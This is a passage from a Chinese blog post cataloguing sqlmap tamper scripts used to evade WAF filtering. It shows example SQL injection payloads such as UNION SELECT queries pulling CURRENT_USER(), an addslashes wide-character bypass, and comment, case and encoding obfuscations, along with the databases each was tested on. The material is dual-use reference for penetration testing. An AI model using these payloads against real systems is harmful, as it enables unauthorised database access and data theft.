#555555;"><br><div id="highlighter_177692" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 UNION SELECT 2–’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 UNIOUNIONN SELESELECTCT 2–’</code> <code class="sql plain">Tested against: </code><code class="sql color1" style="color: gray !important;">all</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2randomblank.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p><br><div style="color: #555555;"><br><div id="highlighter_934294" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘SELECT id FROM users’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘SELECT%0Did%0DFROM%0Ausers’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against: all</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：sp_password.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p><br><div style="color: #555555;"><br><div id="highlighter_124416" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227– ‘</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227– sp_password’</code> <code class="sql plain">Requirement: <em> MSSQL </em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：chardoubleencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用: 双url编码(不处理以编码的)</p><br><div style="color: #555555;"><br><div id="highlighter_277513" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">FIELD </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code><code class="sql plain">%20TABLE </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：unionalltounion.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：替换UNION ALL SELECT UNION SELECT</p><br><p style="color: #555555;">Example: (‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’</p><br><p style="color: #555555;">Requirement: all</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：charencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：url编码</p><br><div style="color: #555555;"><br><div id="highlighter_568327" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">&nbsp;&nbsp; Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">FIELD </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code><code class="sql plain">%20TABLE</code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em>&nbsp;&nbsp; </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：randomcase.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：随机大小写 Example:</p><br><ul style="color: #555555;"><br><li>Input: INSERT</li><br><li>Output: InsERt</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：unmagicquotes.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：宽字符绕过 GPC addslashes</p><br><div style="color: #555555;"><br><div id="highlighter_770532" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: 1′ </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">1=1 </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1%bf%27 </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">1=1–%20</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：randomcomments.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用/**/分割sql关键字</p><br><div style="color: #555555;"><br><div id="highlighter_687317" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">‘</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">INSERT</code><code class="sql plain">’ becomes ‘</code><code class="sql color1" style="color: gray !important;">IN</code><code class="sql plain">//S//ERT’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：charunicodeencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：字符串 unicode 编码</p><br><div style="color: #555555;"><br><div id="highlighter_535588" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">FIELD%20FROM </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">TABLE</code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>ASP</li><br><li>ASP.NET</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2000</li><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 5.1.56</li><br><li>PostgreSQL 9.0.3</li><br></ul><br><p style="color: #555555;">案例一: wooyun.org/bugs/wooyun-2010-074261</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：securesphere.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：追加特制的字符串</p><br><div style="color: #555555;"><br><div id="highlighter_759524" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 1=1’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">“1 AND 1=1 and ‘0having’=’0having’”</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against: all</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：versionedmorekeywords.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：注释绕过</p><br><div style="color: #555555;"><br><div id="highlighter_319716" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: 1 </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">UNION</code> <code class="sql color1" style="color: gray !important;">ALL</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain">, </code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain">, CONCAT(</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,122,114,115,58),IFNULL(</code><code class="sql color2" style="color: #ff1493 !important;">CAST</code><code class="sql plain">(</code><code class="sql color2" style="color: #ff1493 !important;">CURRENT_USER</code><code class="sql plain">() </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">AS</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(32)),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,115,114,121,58))# </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1/!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">UNION</code><code class="sql plain"><strong>!</strong></code><code class="sql color1" style="color: gray !important;">ALL</code><code class="sql plain">!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code><code class="sql plain"><strong>!</strong></code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain"><em>/,/</em>!</code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain"><em>/,/</em>!CONCAT<em>/(/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/(58,122,114,115,58),/</em>!IFNULL<em>/(</em></code><code class="sql color2" style="color: #ff1493 !important;">CAST</code><code class="sql plain">(/!</code><code class="sql color2" style="color: #ff1493 !important;">CURRENT_USER</code><code class="sql plain"><em>/()/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">AS</code><code class="sql plain">!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/),/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/(32)),/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/(58,115,114,121,58))# </em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL &gt;= 5.1.13</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2comment.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：Replaces space character (‘ ‘) with comments ‘/**/’</p><br><div style="color: #555555;"><br><div id="highlighter_438696" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">id </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code> <code class="sql plain">users </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code><code class="sql plain">//id//</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code><code class="sql plain">/**/users</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><p style="color: #555555;">案例一:wooyun.org/bugs/wooyun-2010-046496</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：halfversionedmorekeywords.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：关键字前加注释</p><br><div style="color: #555555;"><br><div id="highlighter_672000" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: value’ </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">UNION</code> <code class="sql color1" style="color: gray !important;">ALL</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">CONCAT(</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,107,112,113,58),IFNULL(</code><code class="sql color2" style="color: #ff1493 !important;">CAST</code><code class="sql plain">(</code><code class="sql color2" style="color: #ff1493 !important;">CURRENT_USER</code><code class="sql plain">() </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">AS</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(32)),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,97,110,121,58)), </code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain">, </code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain"># </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">‘QDWa’=</code><code class="sql string" style="color: blue !important;">‘QDWa </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql string" style="color: blue !important;"><em> Output: value’/</em>!0UNION/<em>!0ALL/</em>!0SELECT/<em>!0CONCAT(/</em>!0CHAR(58,107,112,113,58),/<em>!0IFNULL(CAST(/</em>!0CURRENT_USER()/<em>!0AS/</em>!0CHAR),/<em>!0CHAR(32)),/</em>!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’=’</code><code class="sql plain">QDWa</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL &lt; 5.1</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 4.0.18, 5.0.22</li><br></ul>
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/08/06/bash/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
         
-        </div>
-        <footer class="article-footer">
-            <div class="share-container">
+          常用Bash命令总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Kali系列——信息收集阶段（二）</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu" data-title="sqlmap注入之tamper绕过WAF防火墙过滤" data-url="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
 
 
 
 </div>
-
-    <a data-url="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/" data-id="cisyskchr0007oms5hrmkfi8v" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
-<script>
-    (function ($) {
-        // Prevent duplicate binding
-        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
-            __SHARE_BUTTON_BINDED__ = true;
-        } else {
-            return;
-        }
-        $('body').on('click', function() {
-            $('.article-share-box.on').removeClass('on');
-        }).on('click', '.article-share-link', function(e) {
-            e.stopPropagation();
-
-            var $this = $(this),
-                url = $this.attr('data-url'),
-                encodedUrl = encodeURIComponent(url),
-                id = 'article-share-box-' + $this.attr('data-id'),
-                offset = $this.offset(),
-                box;
-
-            if ($('#' + id).length) {
-                box = $('#' + id);
-
-                if (box.hasClass('on')){
-                    box.removeClass('on');
-                    return;
-                }
-            } else {
-                var html = [
-                    '<div id="' + id + '" class="article-share-box">',
-                        '<input class="article-share-input" value="' + url + '">',
-                        '<div class="article-share-links">',
-                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
-                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
-                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
-                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
-                        '</div>',
-                    '</div>'
-                ].join('');
-
-              box = $(html);
-
-              $('body').append(box);
-            }
-
-            $('.article-share-box.on').hide();
-
-            box.css({
-                top: offset.top + 25,
-                left: offset.left
-            }).addClass('on');
-
-        }).on('click', '.article-share-box', function (e) {
-            e.stopPropagation();
-        }).on('click', '.article-share-box-input', function () {
-            $(this).select();
-        }).on('click', '.article-share-box-link', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-
-            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
-        });
-    })(jQuery);
-</script>
-
-            
-    
-        <a href="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/">评论</a>
-    
-
-        </footer>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 Ivan
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
     </div>
-    
-        
-<nav id="article-nav">
-    
-        <a href="/2016/08/06/bash/" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">上一篇</strong>
-            <div class="article-nav-title">
-                
-                    常用Bash命令总结
-                
-            </div>
-        </a>
-    
-    
-        <a href="/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/" id="article-nav-older" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">下一篇</strong>
-            <div class="article-nav-title">Kali系列——信息收集阶段（二）</div>
-        </a>
-    
-</nav>
-
-
-    
-</article>
-
-
-    
-    <section id="comments">
-    
-        
-    <div id="disqus_thread">
-        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    </div>
-
-    
-    </section>
-
-</section>
-            
-                <aside id="sidebar">
-   
-        
-    <div class="widget-wrap">
-        <h3 class="widget-title">最新文章</h3>
-        <div class="widget">
-            <ul id="recent-post" class="">
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/26/templcd/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/26/templcd/" class="title">树莓派实时温湿度监测进阶</a></p>
-                            <p class="item-date"><time datetime="2016-08-26T07:19:14.000Z" itemprop="datePublished">2016-08-26</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/25/ba-kalifang-dao-upan-li/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/25/ba-kalifang-dao-upan-li/" class="title">把KALI放到U盘里</a></p>
-                            <p class="item-date"><time datetime="2016-08-25T11:26:45.000Z" itemprop="datePublished">2016-08-25</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/25/rpi-tmp-hdt-platform/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/25/rpi-tmp-hdt-platform/" class="title">基于树莓派的实时温度湿度监测平台</a></p>
-                            <p class="item-date"><time datetime="2016-08-25T05:39:08.000Z" itemprop="datePublished">2016-08-25</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/20/916/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/20/916/" class="title">我怀念的依旧是916</a></p>
-                            <p class="item-date"><time datetime="2016-08-20T15:22:01.000Z" itemprop="datePublished">2016-08-20</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/" class="title">海外App生存指南</a></p>
-                            <p class="item-date"><time datetime="2016-08-12T15:13:34.000Z" itemprop="datePublished">2016-08-12</time></p>
-                        </div>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-
-    
-        
-    
-        
-    <div class="widget-wrap">
-        <h3 class="widget-title">归档</h3>
-        <div class="widget">
-            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">5</span></li></ul>
-        </div>
-    </div>
-
-    
-        
-    <div class="widget-wrap">
-        <h3 class="widget-title">标签</h3>
-        <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali-转载/"> - Kali - 转载</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创/"> - 原创</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创-Hack/"> - 原创 - Hack</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创-Tool/"> - 原创 - Tool</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创-树莓派/"> - 原创 - 树莓派</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/树莓派-原创/"> - 树莓派 - 原创</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/转载-Hack/"> - 转载 - Hack</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/转载-Tool/"> - 转载 - Tool</a><span class="tag-list-count">3</span></li></ul>
-        </div>
-    </div>
-
-    
-        
-    <div class="widget-wrap">
